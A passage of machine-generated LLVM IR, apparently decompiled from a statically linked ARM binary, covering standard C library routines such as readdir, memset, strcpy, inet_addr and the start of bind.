  %v1_12874 = phi i32 [ %v0_1282c, %dec_label_pc_12828 ], [ %v0_12864, %dec_label_pc_12860 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_12828 ], [ %v1_12870, %dec_label_pc_12860 ]
  %v2_12874 = sext i16 %v2_12874.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_12874 = add i32 %v1_12874, %v2_12874
  %v4_12874 = inttoptr i32 %v3_12874 to i32*
  store i32 %storemerge, i32* %v4_12874, align 4
  %v0_12894.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12894

dec_label_pc_1287c:                               ; preds = %dec_label_pc_12854
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_12880 = load i32, i32* @r4, align 4
  %v2_12884 = call i32 @fd_to_DIR(i32 %v0_12880, i32 %tmp)
  store i32 %v2_12884, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12894

dec_label_pc_12890:                               ; preds = %entry, %dec_label_pc_12840
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12894

dec_label_pc_12894:                               ; preds = %dec_label_pc_1287c, %dec_label_pc_12874, %dec_label_pc_12890
  %v0_12894 = phi i32 [ %v2_12884, %dec_label_pc_1287c ], [ %v0_12894.pre, %dec_label_pc_12874 ], [ 0, %dec_label_pc_12890 ]
  ret i32 %v0_12894

; uselistorder directives
  uselistorder i32 %v1_12854, { 1, 0 }
  uselistorder i32 %v2_12848, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 21, { 6, 0, 7, 5, 8, 4, 9, 1, 10, 2, 11, 3, 12 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_12894, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12890, { 1, 0 }
  uselistorder label %dec_label_pc_12874, { 1, 0 }
}

define i32 @__GI_readdir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_128ac = load i32, i32* @r4, align 4
  %v6_128ac = load i32, i32* @r5, align 4
  %v9_128ac = load i32, i32* @r6, align 4
  %v12_128ac = load i32, i32* @r7, align 4
  %v15_128ac = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* @r6, align 4
  %v1_128c0 = add i32 %tmp, 24
  store i32 %v1_128c0, i32* @r4, align 4
  %v4_128c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 68) to i32*), align 4
  store i32 %v4_128c4, i32* %r1.global-to-local, align 4
  store i32 %v1_128c0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_128d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_128d8)
  %v0_128ec = load i32, i32* @r6, align 4
  %v2_128ec = add i32 %v0_128ec, 16
  %v3_128ec = inttoptr i32 %v2_128ec to i32*
  %v4_128ec = load i32, i32* %v3_128ec, align 4
  store i32 %v4_128ec, i32* @ip, align 4
  store i32 76024, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_128ec)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_128fc

dec_label_pc_128fc:                               ; preds = %dec_label_pc_1292c, %entry
  %v0_128fc = load i32, i32* @r5, align 4
  %v1_128fc = add i32 %v0_128fc, 4
  %v2_128fc = inttoptr i32 %v1_128fc to i32*
  %v3_128fc = load i32, i32* %v2_128fc, align 4
  store i32 %v3_128fc, i32* %r2.global-to-local, align 4
  %v4_128fc = add i32 %v0_128fc, 8
  %v5_128fc = inttoptr i32 %v4_128fc to i32*
  %v6_128fc = load i32, i32* %v5_128fc, align 4
  %tmp10 = icmp ugt i32 %v6_128fc, %v3_128fc
  br i1 %tmp10, label %dec_label_pc_1292c, label %dec_label_pc_12908

dec_label_pc_12908:                               ; preds = %dec_label_pc_128fc
  %v1_12908 = inttoptr i32 %v0_128fc to i32*
  %v2_12908 = load i32, i32* %v1_12908, align 4
  %v1_1290c = add i32 %v0_128fc, 12
  %v2_1290c = inttoptr i32 %v1_1290c to i32*
  %v3_1290c = load i32, i32* %v2_1290c, align 4
  store i32 %v3_1290c, i32* %r1.global-to-local, align 4
  %v1_12910 = add i32 %v0_128fc, 20
  %v2_12910 = inttoptr i32 %v1_12910 to i32*
  %v3_12910 = load i32, i32* %v2_12910, align 4
  store i32 %v3_12910, i32* %r2.global-to-local, align 4
  %v4_12914 = call i32 @__getdents(i32 %v2_12908, i32 %v3_1290c, i32 %v3_12910, i32 %v6_128fc)
  %tmp9 = icmp slt i32 %v4_12914, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_12924

.thread:                                          ; preds = %dec_label_pc_12908
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_12958

dec_label_pc_12924:                               ; preds = %dec_label_pc_12908
  %v1_12924 = load i32, i32* @r5, align 4
  %v2_12924 = add i32 %v1_12924, 8
  %v3_12924 = inttoptr i32 %v2_12924 to i32*
  store i32 %v4_12914, i32* %v3_12924, align 4
  %v0_12928 = load i32, i32* @r7, align 4
  %v1_12928 = load i32, i32* @r5, align 4
  %v2_12928 = add i32 %v1_12928, 4
  %v3_12928 = inttoptr i32 %v2_12928 to i32*
  store i32 %v0_12928, i32* %v3_12928, align 4
  %v0_1292c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1292c

dec_label_pc_1292c:                               ; preds = %dec_label_pc_128fc, %dec_label_pc_12924
  %v1_1293c = phi i32 [ %v0_128fc, %dec_label_pc_128fc ], [ %v0_1292c.pre, %dec_label_pc_12924 ]
  %v1_1292c = add i32 %v1_1293c, 4
  %v2_1292c = inttoptr i32 %v1_1292c to i32*
  %v3_1292c = load i32, i32* %v2_1292c, align 4
  store i32 %v3_1292c, i32* %r2.global-to-local, align 4
  %v1_12930 = add i32 %v1_1293c, 12
  %v2_12930 = inttoptr i32 %v1_12930 to i32*
  %v3_12930 = load i32, i32* %v2_12930, align 4
  store i32 %v3_12930, i32* %r1.global-to-local, align 4
  %v2_12934 = add i32 %v3_12930, %v3_1292c
  store i32 %v2_12934, i32* @r4, align 4
  %v1_12938 = add i32 %v2_12934, 4
  %v2_12938 = inttoptr i32 %v1_12938 to i32*
  %v3_12938 = load i32, i32* %v2_12938, align 4
  %v2_1293c = add i32 %v1_1293c, 16
  %v3_1293c = inttoptr i32 %v2_1293c to i32*
  store i32 %v3_12938, i32* %v3_1293c, align 4
  %v0_12940 = load i32, i32* @r4, align 4
  %v1_12940 = add i32 %v0_12940, 8
  %v2_12940 = inttoptr i32 %v1_12940 to i16*
  %v3_12940 = load i16, i16* %v2_12940, align 2
  %v4_12940 = zext i16 %v3_12940 to i32
  %v0_12944 = load i32, i32* %r2.global-to-local, align 4
  %v1_12944 = load i32, i32* %r1.global-to-local, align 4
  %v2_12944 = add i32 %v1_12944, %v0_12944
  %v3_12944 = inttoptr i32 %v2_12944 to i32*
  %v4_12944 = load i32, i32* %v3_12944, align 4
  store i32 %v4_12944, i32* %r1.global-to-local, align 4
  %v2_12948 = add i32 %v0_12944, %v4_12940
  %v2_1294c = icmp eq i32 %v4_12944, 0
  %v1_12950 = load i32, i32* @r5, align 4
  %v2_12950 = add i32 %v1_12950, 4
  %v3_12950 = inttoptr i32 %v2_12950 to i32*
  store i32 %v2_12948, i32* %v3_12950, align 4
  br i1 %v2_1294c, label %dec_label_pc_128fc, label %dec_label_pc_12958

dec_label_pc_12958:                               ; preds = %dec_label_pc_1292c, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_12964 = load i32, i32* @r6, align 4
  %v2_12964 = add i32 %v0_12964, 44
  %v3_12964 = inttoptr i32 %v2_12964 to i32*
  %v4_12964 = load i32, i32* %v3_12964, align 4
  call void @__pseudo_branch(i32 %v4_12964)
  %v0_12970 = load i32, i32* @r4, align 4
  store i32 %v3_128ac, i32* @r4, align 4
  store i32 %v6_128ac, i32* @r5, align 4
  store i32 %v9_128ac, i32* @r6, align 4
  store i32 %v12_128ac, i32* @r7, align 4
  store i32 %v15_128ac, i32* @lr, align 4
  ret i32 %v0_12970

; uselistorder directives
  uselistorder i32 %v1_1293c, { 0, 2, 1 }
  uselistorder i32 %v6_128fc, { 1, 0 }
  uselistorder i32 %v0_128fc, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_1292c, { 1, 0 }
}

define i32 @function_12984(i32 %arg1) local_unnamed_addr {
dec_label_pc_12984:
  %v0_12984 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12984, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12984
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12984, %bb
  %v4_12990 = phi i32 [ %arg1, %dec_label_pc_12984 ], [ 0, %bb ]
  ret i32 %v4_12990

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_12994 = load i32, i32* @lr, align 4
  %v0_1299c = call i32 @__aeabi_read_tp()
  %v3_129a0 = load i16, i16* @global_var_23068.363, align 2
  %v4_129a0 = sext i16 %v3_129a0 to i32
  %v2_129a4 = add i32 %v4_129a0, %v0_1299c
  store i32 %v0_12994, i32* @lr, align 4
  ret i32 %v2_129a4
}

define i32 @clock(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_129b8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_129b8, i32* @r0, align 4
  %v1_129c0 = call i32 @times(i32 %v2_129b8)
  %v2_129c4 = load i32, i32* %stack_var_-24, align 4
  %v2_129c8 = add i32 %v2_129c4, %tmp
  %v2_129d0 = mul i32 %v2_129c8, 10000
  %v1_129d4 = and i32 %v2_129d0, 2147483632
  ret i32 %v1_129d4

; uselistorder directives
  uselistorder i32 %v2_129b8, { 1, 0 }
}

define i32 @"$d.9"(i32 %arg1) local_unnamed_addr {
dec_label_pc_129e4:
  %v0_129e4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_129e4, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_129e4
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_129e4, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_129f0 = call i32 @_memcpy()
  ret i32 %v0_129f0
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_12a00 = call i32 @_memcpy()
  ret i32 %v0_12a00

; uselistorder directives
  uselistorder i32 ()* @_memcpy, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_12a14 = icmp eq i32 %arg3, 8
  store i1 %v8_12a14, i1* %cpsr_z.global-to-local, align 1
  %v5_12a18 = icmp slt i32 %arg3, 8
  br i1 %v5_12a18, label %dec_label_pc_12a78, label %dec_label_pc_12a1c

dec_label_pc_12a1c:                               ; preds = %entry
  %v4_12a1c = mul i32 %arg2, 256
  %v5_12a1c = or i32 %v4_12a1c, %arg2
  %v4_12a20 = mul i32 %v5_12a1c, 65536
  %v5_12a20 = or i32 %v4_12a20, %v5_12a1c
  store i32 %v5_12a20, i32* @r1, align 4
  %v1_12a2457 = urem i32 %tmp, 4
  %v2_12a2458 = icmp eq i32 %v1_12a2457, 0
  store i1 %v2_12a2458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_12a2458, label %dec_label_pc_12a34, label %bb

bb:                                               ; preds = %dec_label_pc_12a1c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_12a1c ]
  %v3_12a2859 = phi i32 [ %v6_12a28, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_12a1c ]
  %v4_12a28 = inttoptr i32 %v3_12a2859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_12a28, align 1
  %v5_12a28 = load i32, i32* @r3, align 4
  %v6_12a28 = add i32 %v5_12a28, 1
  store i32 %v6_12a28, i32* @r3, align 4
  %v0_12a2c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_12a38.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_12a2c.pr, label %dec_label_pc_12a34, label %.thread

.thread:                                          ; preds = %bb
  %v2_12a2c = add i32 %v0_12a38.pr.pre, -1
  store i32 %v2_12a2c, i32* %r2.global-to-local, align 4
  %v1_12a24 = urem i32 %v6_12a28, 4
  %v2_12a24 = icmp eq i32 %v1_12a24, 0
  store i1 %v2_12a24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12a24, label %dec_label_pc_12a34, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_12a28.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_12a28.pre to i8
  br label %bb

dec_label_pc_12a34:                               ; preds = %.thread, %bb, %dec_label_pc_12a1c
  %v0_12a4028 = phi i32 [ %tmp, %dec_label_pc_12a1c ], [ %v6_12a28, %bb ], [ %v6_12a28, %.thread ]
  %v0_12a38.pr = phi i32 [ %arg3, %dec_label_pc_12a1c ], [ %v0_12a38.pr.pre, %bb ], [ %v2_12a2c, %.thread ]
  %v0_12a34 = load i32, i32* @r1, align 4
  store i32 %v0_12a34, i32* %ip.global-to-local, align 4
  %v8_12a3810 = icmp eq i32 %v0_12a38.pr, 8
  store i1 %v8_12a3810, i1* %cpsr_z.global-to-local, align 1
  %v5_12a3c11 = icmp slt i32 %v0_12a38.pr, 8
  br i1 %v5_12a3c11, label %dec_label_pc_12a78, label %dec_label_pc_12a40.preheader

dec_label_pc_12a40.preheader:                     ; preds = %dec_label_pc_12a34
  %v1_12a4046 = inttoptr i32 %v0_12a4028 to i32*
  store i32 %v0_12a34, i32* %v1_12a4046, align 4
  %v3_12a4047 = add i32 %v0_12a4028, 4
  %v4_12a4048 = inttoptr i32 %v3_12a4047 to i32*
  %v5_12a4049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_12a4049, i32* %v4_12a4048, align 4
  %v6_12a4050 = add i32 %v0_12a4028, 8
  store i32 %v6_12a4050, i32* @r3, align 4
  %v0_12a4451 = load i32, i32* %r2.global-to-local, align 4
  %v1_12a4452 = add i32 %v0_12a4451, -8
  store i32 %v1_12a4452, i32* %r2.global-to-local, align 4
  %v5_12a4c53 = icmp slt i32 %v1_12a4452, 8
  br i1 %v5_12a4c53, label %dec_label_pc_12a40.dec_label_pc_12a78.loopexit_crit_edge, label %dec_label_pc_12a50

dec_label_pc_12a50:                               ; preds = %dec_label_pc_12a40.preheader, %dec_label_pc_12a38.dec_label_pc_12a40_crit_edge
  %v6_12a4055 = phi i32 [ %v6_12a40, %dec_label_pc_12a38.dec_label_pc_12a40_crit_edge ], [ %v6_12a4050, %dec_label_pc_12a40.preheader ]
  %v0_12a4054 = phi i32 [ %v12_12a6c, %dec_label_pc_12a38.dec_label_pc_12a40_crit_edge ], [ %v0_12a4028, %dec_label_pc_12a40.preheader ]
  %v1_12a50 = inttoptr i32 %v6_12a4055 to i32*
  %v2_12a50 = load i32, i32* @r1, align 4
  store i32 %v2_12a50, i32* %v1_12a50, align 4
  %v3_12a50 = add i32 %v0_12a4054, 12
  %v4_12a50 = inttoptr i32 %v3_12a50 to i32*
  %v5_12a50 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_12a50, i32* %v4_12a50, align 4
  %v6_12a50 = add i32 %v0_12a4054, 16
  store i32 %v6_12a50, i32* @r3, align 4
  %v0_12a54 = load i32, i32* %r2.global-to-local, align 4
  %v1_12a54 = add i32 %v0_12a54, -8
  store i32 %v1_12a54, i32* %r2.global-to-local, align 4
  %v5_12a5c = icmp slt i32 %v1_12a54, 8
  br i1 %v5_12a5c, label %dec_label_pc_12a50.dec_label_pc_12a78.loopexit_crit_edge, label %dec_label_pc_12a60

dec_label_pc_12a60:                               ; preds = %dec_label_pc_12a50
  %v1_12a60 = inttoptr i32 %v6_12a50 to i32*
  %v2_12a60 = load i32, i32* @r1, align 4
  store i32 %v2_12a60, i32* %v1_12a60, align 4
  %v3_12a60 = add i32 %v0_12a4054, 20
  %v4_12a60 = inttoptr i32 %v3_12a60 to i32*
  %v5_12a60 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_12a60, i32* %v4_12a60, align 4
  %v6_12a60 = add i32 %v0_12a4054, 24
  store i32 %v6_12a60, i32* @r3, align 4
  %v0_12a64 = load i32, i32* %r2.global-to-local, align 4
  %v1_12a64 = add i32 %v0_12a64, -8
  store i32 %v1_12a64, i32* %r2.global-to-local, align 4
  %v5_12a6c = icmp slt i32 %v1_12a64, 8
  br i1 %v5_12a6c, label %dec_label_pc_12a60.dec_label_pc_12a78.loopexit_crit_edge, label %dec_label_pc_12a38

dec_label_pc_12a38:                               ; preds = %dec_label_pc_12a60
  %v7_12a6c = inttoptr i32 %v6_12a60 to i32*
  %v8_12a6c = load i32, i32* @r1, align 4
  store i32 %v8_12a6c, i32* %v7_12a6c, align 4
  %v9_12a6c = add i32 %v0_12a4054, 28
  %v10_12a6c = inttoptr i32 %v9_12a6c to i32*
  %v11_12a6c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_12a6c, i32* %v10_12a6c, align 4
  %v12_12a6c = add i32 %v0_12a4054, 32
  store i32 %v12_12a6c, i32* @r3, align 4
  %v6_12a70 = load i32, i32* %r2.global-to-local, align 4
  %v7_12a70 = add i32 %v6_12a70, -8
  store i32 %v7_12a70, i32* %r2.global-to-local, align 4
  %v5_12a3c = icmp slt i32 %v7_12a70, 8
  br i1 %v5_12a3c, label %dec_label_pc_12a38.dec_label_pc_12a78.loopexit_crit_edge, label %dec_label_pc_12a38.dec_label_pc_12a40_crit_edge

dec_label_pc_12a38.dec_label_pc_12a40_crit_edge:  ; preds = %dec_label_pc_12a38
  %v2_12a40.pre = load i32, i32* @r1, align 4
  %v1_12a40 = inttoptr i32 %v12_12a6c to i32*
  store i32 %v2_12a40.pre, i32* %v1_12a40, align 4
  %v3_12a40 = add i32 %v0_12a4054, 36
  %v4_12a40 = inttoptr i32 %v3_12a40 to i32*
  %v5_12a40 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_12a40, i32* %v4_12a40, align 4
  %v6_12a40 = add i32 %v0_12a4054, 40
  store i32 %v6_12a40, i32* @r3, align 4
  %v0_12a44 = load i32, i32* %r2.global-to-local, align 4
  %v1_12a44 = add i32 %v0_12a44, -8
  store i32 %v1_12a44, i32* %r2.global-to-local, align 4
  %v5_12a4c = icmp slt i32 %v1_12a44, 8
  br i1 %v5_12a4c, label %dec_label_pc_12a40.dec_label_pc_12a78.loopexit_crit_edge, label %dec_label_pc_12a50

dec_label_pc_12a38.dec_label_pc_12a78.loopexit_crit_edge: ; preds = %dec_label_pc_12a38
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12a78

dec_label_pc_12a40.dec_label_pc_12a78.loopexit_crit_edge: ; preds = %dec_label_pc_12a38.dec_label_pc_12a40_crit_edge, %dec_label_pc_12a40.preheader
  %v1_12a44.lcssa = phi i32 [ %v1_12a4452, %dec_label_pc_12a40.preheader ], [ %v1_12a44, %dec_label_pc_12a38.dec_label_pc_12a40_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12a78

dec_label_pc_12a50.dec_label_pc_12a78.loopexit_crit_edge: ; preds = %dec_label_pc_12a50
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12a78

dec_label_pc_12a60.dec_label_pc_12a78.loopexit_crit_edge: ; preds = %dec_label_pc_12a60
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12a78

dec_label_pc_12a78:                               ; preds = %dec_label_pc_12a34, %dec_label_pc_12a38.dec_label_pc_12a78.loopexit_crit_edge, %dec_label_pc_12a40.dec_label_pc_12a78.loopexit_crit_edge, %dec_label_pc_12a50.dec_label_pc_12a78.loopexit_crit_edge, %dec_label_pc_12a60.dec_label_pc_12a78.loopexit_crit_edge, %entry
  %v0_12a80 = phi i32 [ %arg3, %entry ], [ %v1_12a64, %dec_label_pc_12a60.dec_label_pc_12a78.loopexit_crit_edge ], [ %v1_12a54, %dec_label_pc_12a50.dec_label_pc_12a78.loopexit_crit_edge ], [ %v1_12a44.lcssa, %dec_label_pc_12a40.dec_label_pc_12a78.loopexit_crit_edge ], [ %v7_12a70, %dec_label_pc_12a38.dec_label_pc_12a78.loopexit_crit_edge ], [ %v0_12a38.pr, %dec_label_pc_12a34 ]
  %v2_12a78 = icmp eq i32 %v0_12a80, 0
  store i1 %v2_12a78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12a78, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_12a78
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_12a78
  %v1_12a80 = sub i32 7, %v0_12a80
  store i32 %v1_12a80, i32* %r2.global-to-local, align 4
  %v3_12a84 = mul i32 %v1_12a80, 4
  %v4_12a84 = add i32 %v3_12a84, ptrtoint (i32* @global_var_12a8c.406 to i32)
  call void @__pseudo_branch(i32 %v4_12a84)
  %v0_12a8c = load i32, i32* @r1, align 4
  %v1_12a8c = trunc i32 %v0_12a8c to i8
  %v2_12a8c = load i32, i32* @r3, align 4
  %v3_12a8c = inttoptr i32 %v2_12a8c to i8*
  store i8 %v1_12a8c, i8* %v3_12a8c, align 1
  %v4_12a8c = load i32, i32* @r3, align 4
  %v5_12a8c = add i32 %v4_12a8c, 1
  store i32 %v5_12a8c, i32* %r3.global-to-local, align 4
  %v0_12a90 = load i32, i32* @r1, align 4
  %v1_12a90 = trunc i32 %v0_12a90 to i8
  %v3_12a90 = inttoptr i32 %v5_12a8c to i8*
  store i8 %v1_12a90, i8* %v3_12a90, align 1
  %v4_12a90 = load i32, i32* %r3.global-to-local, align 4
  %v5_12a90 = add i32 %v4_12a90, 1
  store i32 %v5_12a90, i32* %r3.global-to-local, align 4
  %v0_12a94 = load i32, i32* @r1, align 4
  %v1_12a94 = trunc i32 %v0_12a94 to i8
  %v3_12a94 = inttoptr i32 %v5_12a90 to i8*
  store i8 %v1_12a94, i8* %v3_12a94, align 1
  %v4_12a94 = load i32, i32* %r3.global-to-local, align 4
  %v5_12a94 = add i32 %v4_12a94, 1
  store i32 %v5_12a94, i32* %r3.global-to-local, align 4
  %v0_12a98 = load i32, i32* @r1, align 4
  %v1_12a98 = trunc i32 %v0_12a98 to i8
  %v3_12a98 = inttoptr i32 %v5_12a94 to i8*
  store i8 %v1_12a98, i8* %v3_12a98, align 1
  %v4_12a98 = load i32, i32* %r3.global-to-local, align 4
  %v5_12a98 = add i32 %v4_12a98, 1
  store i32 %v5_12a98, i32* %r3.global-to-local, align 4
  %v0_12a9c = load i32, i32* @r1, align 4
  %v1_12a9c = trunc i32 %v0_12a9c to i8
  %v3_12a9c = inttoptr i32 %v5_12a98 to i8*
  store i8 %v1_12a9c, i8* %v3_12a9c, align 1
  %v4_12a9c = load i32, i32* %r3.global-to-local, align 4
  %v5_12a9c = add i32 %v4_12a9c, 1
  store i32 %v5_12a9c, i32* %r3.global-to-local, align 4
  %v0_12aa0 = load i32, i32* @r1, align 4
  %v1_12aa0 = trunc i32 %v0_12aa0 to i8
  %v3_12aa0 = inttoptr i32 %v5_12a9c to i8*
  store i8 %v1_12aa0, i8* %v3_12aa0, align 1
  %v4_12aa0 = load i32, i32* %r3.global-to-local, align 4
  %v5_12aa0 = add i32 %v4_12aa0, 1
  store i32 %v5_12aa0, i32* %r3.global-to-local, align 4
  %v0_12aa4 = load i32, i32* @r1, align 4
  %v1_12aa4 = trunc i32 %v0_12aa4 to i8
  %v3_12aa4 = inttoptr i32 %v5_12aa0 to i8*
  store i8 %v1_12aa4, i8* %v3_12aa4, align 1
  %v4_12aa4 = load i32, i32* %r3.global-to-local, align 4
  %v5_12aa4 = add i32 %v4_12aa4, 1
  store i32 %v5_12aa4, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_12a40, { 1, 0 }
  uselistorder i32 %v12_12a6c, { 1, 2, 0 }
  uselistorder i32 %v0_12a4054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_12a38.pr, { 0, 2, 1 }
  uselistorder i32 %v6_12a28, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_12a1c, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 10, 3, 4, 5, 6, 7, 8, 9, 1, 11, 13, 12, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 4, 3, 2, 5, 1, 9, 8, 0, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_12a78, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_12a50, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_12ac01 = load i32, i32* @r1, align 4
  %v1_12ac02 = inttoptr i32 %v0_12ac01 to i8*
  %v2_12ac03 = load i8, i8* %v1_12ac02, align 1
  %v2_12ac45 = icmp eq i8 %v2_12ac03, 0
  store i1 %v2_12ac45, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_12ac03, i8* %arg1, align 1
  br i1 %v2_12ac45, label %dec_label_pc_12ad0, label %dec_label_pc_12ab8

dec_label_pc_12ab8:                               ; preds = %entry, %dec_label_pc_12ab8
  %v0_12ab8 = load i32, i32* @r1, align 4
  %v1_12ab8 = add i32 %v0_12ab8, 1
  store i32 %v1_12ab8, i32* @r1, align 4
  %v0_12abc = load i32, i32* %r2.global-to-local, align 4
  %v1_12abc = add i32 %v0_12abc, 1
  store i32 %v1_12abc, i32* %r2.global-to-local, align 4
  %v1_12ac0 = inttoptr i32 %v1_12ab8 to i8*
  %v2_12ac0 = load i8, i8* %v1_12ac0, align 1
  %v2_12ac4 = icmp eq i8 %v2_12ac0, 0
  store i1 %v2_12ac4, i1* %cpsr_z.global-to-local, align 1
  %v3_12ac8 = inttoptr i32 %v1_12abc to i8*
  store i8 %v2_12ac0, i8* %v3_12ac8, align 1
  %v0_12acc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12acc, label %dec_label_pc_12ad0, label %dec_label_pc_12ab8

dec_label_pc_12ad0:                               ; preds = %dec_label_pc_12ab8, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12ab8, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_12adc = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_12adc, i32* @r1, align 4
  %v0_12ae0 = call i32 @inet_aton()
  %v2_12ae4 = icmp eq i32 %v0_12ae0, 0
  %v4_12ae8 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_12ae4, i32 -1, i32 %v4_12ae8
  ret i32 %storemerge
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12afc = load i32, i32* @r7, align 4
  store i32 %v3_12afc, i32* %stack_var_-8, align 4
  %v0_12b08 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12b08, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12b08, -4095
  br i1 %tmp, label %dec_label_pc_12b30, label %dec_label_pc_12b18

dec_label_pc_12b18:                               ; preds = %entry
  %v0_12b1c = call i32 @__aeabi_read_tp()
  %v3_12b20 = load i16, i16* @global_var_23068.363, align 2
  %v4_12b20 = sext i16 %v3_12b20 to i32
  %v0_12b24 = load i32, i32* %r2.global-to-local, align 4
  %v1_12b24 = sub i32 0, %v0_12b24
  store i32 %v1_12b24, i32* %r2.global-to-local, align 4
  %v3_12b28 = add i32 %v4_12b20, %v0_12b1c
  %v4_12b28 = inttoptr i32 %v3_12b28 to i32*
